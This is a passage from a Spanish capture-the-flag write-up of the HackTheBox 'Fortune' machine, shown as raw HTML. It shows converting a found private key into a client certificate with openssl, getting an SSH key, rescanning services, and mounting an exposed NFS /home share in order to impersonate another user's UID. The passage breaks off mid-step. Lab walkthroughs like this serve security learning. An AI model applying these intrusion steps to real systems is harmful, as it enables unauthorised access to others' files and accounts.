&lt;p&gt;Al realizar una enumeracion de carpeta y archivos encontramos en la carpeta del usuario &lt;code&gt;bob&lt;/code&gt; (&lt;code&gt;/home/bob/&lt;/code&gt;) certificados que pueden pertenecen a la pagina web https.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;/home/bob
├── ca
│   ├── certs
│   │   └── ca.cert.pem
│   ├── crl
│   ├── index.txt
│   ├── index.txt.attr
│   ├── index.txt.old
│   ├── intermediate
│   │   ├── certs
│   │   │   ├── ca-chain.cert.pem
│   │   │   ├── fortune.htb.cert.pem
│   │   │   └── intermediate.cert.pem
│   │   ├── crl
│   │   ├── crlnumber
│   │   ├── csr
│   │   │   ├── fortune.htb.csr.pem
│   │   │   └── intermediate.csr.pem
│   │   ├── index.txt
│   │   ├── index.txt.attr
│   │   ├── newcerts
│   │   │   └── 1000.pem
│   │   ├── openssl.cnf
│   │   ├── private
│   │   │   ├── fortune.htb.key.pem
│   │   │   └── intermediate.key.pem
│   │   ├── serial
│   │   └── serial.old
│   ├── newcerts
│   │   └── 1000.pem
│   ├── openssl.cnf
│   ├── private &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;error opening dir&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
│   ├── serial
│   └── serial.old
└── dba
    └── authpf.sql
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;La razon por la cual no podamos acceder a la pagina https es porque no tenemos el certificado de la misma, esta es una grafica de como funciona un certificado.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.certsuperior.com/QueesunCertificadoSSL.aspx&#34;&gt;&lt;strong&gt;certsuperior - Certificados&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://docs.oracle.com/cd/E19226-01/820-7627/bncbs/index.html&#34;&gt;&lt;strong&gt;Oracle - certificados&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://docs.oracle.com/cd/E19226-01/820-7627/images/security-sslBMAWithCertificates.gif&#34; alt=&#34;IMAGE&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Para poder acceder a la pagina debemos de crear nuestro archivo &lt;code&gt;pkc12&lt;/code&gt; el cual contiene el certificado y la clave, copiamos a nuestra maquina local los archivos &lt;code&gt;intermediate.cert.pem&lt;/code&gt; e &lt;code&gt;intermediate.key.pem&lt;/code&gt;, utilizando openssl generamos el certificado con el siguiente comando:&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.ssl.com/how-to/create-a-pfx-p12-certificate-file-using-openssl/&#34;&gt;&lt;strong&gt;ssl - Certificate File&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.ibm.com/support/knowledgecenter/en/SSPH29_9.0.1/com.ibm.help.common.infocenter.aps/t_ConvertthepfxCertificatetopemFormat068.html&#34;&gt;&lt;strong&gt;ibm - Certificate&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;openssl pkcs12 -export -out cert.p12 -in intermediate.cert.pem -inkey intermediate.key.pem -passin pass:root -passout pass:root
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/fortune/Screenshot%20from%202019-03-19%2017-26-46.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Obtenemos el certificado y lo importamos a nuestro navegador en las configuraciones de certificado.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/fortune/Screenshot%20from%202019-03-19%2019-31-53.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Visitamos la pagina en https y nos muestra lo siguiente:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/fortune/Screenshot%20from%202019-03-19%2019-33-16.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/fortune/Screenshot%20from%202019-03-19%2019-34-46.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Al visitar la pagina &lt;code&gt;/generate&lt;/code&gt; nos muestra una clave publica agregada al los archivos de autorizacion ssh de la maquina y una clave privada con la cual nos podemos conectar al mismo.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/fortune/Screenshot%20from%202019-03-19%2019-35-47.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Nos conectamos al servicio ssh con la clave generada y el usuario &lt;code&gt;nfsuser&lt;/code&gt;, nos muestra el siguiente mensaje, pero nuestra shell no es interactiva:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/fortune/Screenshot%20from%202019-03-20%2022-31-02.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Al revisar los procesos que corren en la maquina nos muestra un servicio de &lt;strong&gt;authpf&lt;/strong&gt;:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/fortune/Screenshot%20from%202019-03-20%2022-37-18.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Segun la documentacion de openbsd sobre Authpf nos dice que &lt;strong&gt;&amp;ldquo;es un intérprete (shell) para pasarelas de autenticación. Una pasarela de autenticación es como una pasarela de red normal (también llamada enrutador), con la diferencia que &amp;ldquo;los usuarios se deben autenticar ante la pasarela&amp;rdquo; antes de que se permita que pase el tráfico a través de ésta&amp;rdquo;&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.openbsd.org/faq/pf/authpf.html#loginclass&#34;&gt;&lt;strong&gt;openbsd - authpf&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://home.nuug.no/~peter/pf/blug2011/authpf.html&#34;&gt;&lt;strong&gt;autphf - español&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Las reglas de authpf &lt;code&gt;/etc/authpf/authpf.rules&lt;/code&gt; nos muestran que cualquier usuario ip (&lt;code&gt;$user_ip&lt;/code&gt;) en este caso &lt;code&gt;nfsuser&lt;/code&gt; le de paso o permiso en los protocolos tcp udp.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;nv&#34;&gt;ext_if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;em0&amp;#34;&lt;/span&gt;
pass in quick on &lt;span class=&#34;nv&#34;&gt;$ext_if&lt;/span&gt; inet proto &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt; tcp udp &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; from &lt;span class=&#34;nv&#34;&gt;$user_ip&lt;/span&gt; to &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$ext_if&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; keep state
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Sabiendo que tenemos acceso a los protocolos tcp y udp volvemos a hacer un escaneo de puertos y encontramos los siguientes puertos abiertos:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Starting Nmap 7.70 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2019-03-21 04:58 GMT
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.127
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.18s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;994&lt;/span&gt; closed ports
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.9 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp   open  http       OpenBSD httpd
111/tcp  open  rpcbind    &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RPC &lt;span class=&#34;c1&#34;&gt;#100000)&lt;/span&gt;
443/tcp  open  ssl/https?
2049/tcp open  nfs        2-3 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RPC &lt;span class=&#34;c1&#34;&gt;#100003)&lt;/span&gt;
8081/tcp open  http       OpenBSD httpd

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; IP address &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; host up&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; scanned in 38.31 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Encontramos que hay un servicio rpcbind y nfs que estan corriendo en la maquina, escaneamos el servicio &lt;code&gt;rpcbind&lt;/code&gt;:&lt;/p&gt;
&lt;h2 id=&#34;rpcbind&#34;&gt;RPCBIND&lt;/h2&gt;
&lt;p&gt;Encontramos que el servicio NFS esta corriendo tanto en tcp y udp, por lo que podemos montar los share name de la maquina localmente.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@sckull:~/htb/fortune# rpcinfo -p 10.10.10.127
   program vers proto   port  service
    &lt;span class=&#34;m&#34;&gt;100000&lt;/span&gt;    &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;   tcp    &lt;span class=&#34;m&#34;&gt;111&lt;/span&gt;  portmapper
    &lt;span class=&#34;m&#34;&gt;100000&lt;/span&gt;    &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;   udp    &lt;span class=&#34;m&#34;&gt;111&lt;/span&gt;  portmapper
    &lt;span class=&#34;m&#34;&gt;100005&lt;/span&gt;    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;   udp    &lt;span class=&#34;m&#34;&gt;694&lt;/span&gt;  mountd
    &lt;span class=&#34;m&#34;&gt;100005&lt;/span&gt;    &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt;   udp    &lt;span class=&#34;m&#34;&gt;694&lt;/span&gt;  mountd
    &lt;span class=&#34;m&#34;&gt;100005&lt;/span&gt;    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;   tcp    &lt;span class=&#34;m&#34;&gt;944&lt;/span&gt;  mountd
    &lt;span class=&#34;m&#34;&gt;100005&lt;/span&gt;    &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt;   tcp    &lt;span class=&#34;m&#34;&gt;944&lt;/span&gt;  mountd
    &lt;span class=&#34;m&#34;&gt;100003&lt;/span&gt;    &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;   udp   &lt;span class=&#34;m&#34;&gt;2049&lt;/span&gt;  nfs
    &lt;span class=&#34;m&#34;&gt;100003&lt;/span&gt;    &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt;   udp   &lt;span class=&#34;m&#34;&gt;2049&lt;/span&gt;  nfs
    &lt;span class=&#34;m&#34;&gt;100003&lt;/span&gt;    &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;   tcp   &lt;span class=&#34;m&#34;&gt;2049&lt;/span&gt;  nfs
    &lt;span class=&#34;m&#34;&gt;100003&lt;/span&gt;    &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt;   tcp   &lt;span class=&#34;m&#34;&gt;2049&lt;/span&gt;  nfs
root@sckull:~/htb/fortune# 
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;nfs&#34;&gt;NFS&lt;/h2&gt;
&lt;p&gt;Al revisar los puntos compartidos obtenemos que &lt;code&gt;/home&lt;/code&gt; puede ser montado&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@sckull:~/htb/fortune# showmount -e 10.10.10.127
Export list &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.127:
/home &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;everyone&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
root@sckull:~/htb/fortune# 
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;acceso-a-home&#34;&gt;ACCESO a /home&lt;/h2&gt;
&lt;p&gt;Para acceder a la carpeta &lt;code&gt;/home&lt;/code&gt; debemos montarlo localmente y asi poder acceder a las carpetas y archivos que se encuentran dentro.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;root@sckull:~/htb/fortune# mkdir tmp_nfs
root@sckull:~/htb/fortune# mount -t nfs 10.10.10.127:/home /root/htb/fortune/tmp_nfs
root@sckull:~/htb/fortune# ls tmp_nfs/
bob  charlie  nfsuser
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Observamos que hay tres usuarios de los cuales bob ya conocemos su interior, mas no el de charlie y &lt;strong&gt;nfsuser:&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@sckull:~/htb/fortune# ls -lah tmp_nfs/nfsuser/
total 16K
drwxr-xr-x &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1002&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1002&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;512&lt;/span&gt; Nov  &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; 02:39 .
drwxr-xr-x &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt; root root &lt;span class=&#34;m&#34;&gt;512&lt;/span&gt; Nov  &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; 01:19 ..
-rw-r--r-- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1002&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1002&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;771&lt;/span&gt; Oct &lt;span class=&#34;m&#34;&gt;11&lt;/span&gt; 20:18 .cshrc
-rw-r--r-- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1002&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1002&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;101&lt;/span&gt; Oct &lt;span class=&#34;m&#34;&gt;11&lt;/span&gt; 20:18 .cvsrc
-rw-r--r-- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1002&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1002&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;359&lt;/span&gt; Oct &lt;span class=&#34;m&#34;&gt;11&lt;/span&gt; 20:18 .login
-rw-r--r-- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1002&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1002&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;175&lt;/span&gt; Oct &lt;span class=&#34;m&#34;&gt;11&lt;/span&gt; 20:18 .mailrc
-rw-r--r-- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1002&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1002&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;215&lt;/span&gt; Oct &lt;span class=&#34;m&#34;&gt;11&lt;/span&gt; 20:18 .profile
-rw-r--r-- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1002&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1002&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;87&lt;/span&gt; Oct &lt;span class=&#34;m&#34;&gt;11&lt;/span&gt; 20:18 .Xdefaults
root@sckull:~/htb/fortune# ls -lah tmp_nfs/charlie/
ls: cannot open directory &lt;span class=&#34;s1&#34;&gt;&amp;#39;tmp_nfs/charlie/&amp;#39;&lt;/span&gt;: Permission denied
root@sckull:~/htb/fortune# 
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Podemos ver que a la carpeta del usuario charlie no tenemos acceso, para ello vamos a crear un usuario localmente y un grupo para poder acceder al interior, utilizamos stat para ver informacion de la carpeta, con lo cual vemos que &lt;code&gt;/home/charlie&lt;/code&gt; tiene propiedades &lt;code&gt;uid: 1000 y gid:1000&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@sckull:~/htb/fortune# stat tmp_nfs/charlie/
  File: tmp_nfs/charlie/
  Size: &lt;span class=&#34;m&#34;&gt;512&lt;/span&gt;       	Blocks: &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt;          IO Block: &lt;span class=&#34;m&#34;&gt;32768&lt;/span&gt;  directory
Device: 31h/49d	Inode: &lt;span class=&#34;m&#34;&gt;27648&lt;/span&gt;       Links: &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt;
Access: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0750/drwxr-x---&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;  Uid: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; 1000/ UNKNOWN&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;   Gid: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; 1000/ UNKNOWN&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Access: 2019-03-21 05:17:35.827314870 +0000
Modify: 2019-03-21 05:33:05.655948328 +0000
Change: 2019-03-21 05:33:05.655948328 +0000
 Birth: -
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Creamos un usuario y grupo local para charlie:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
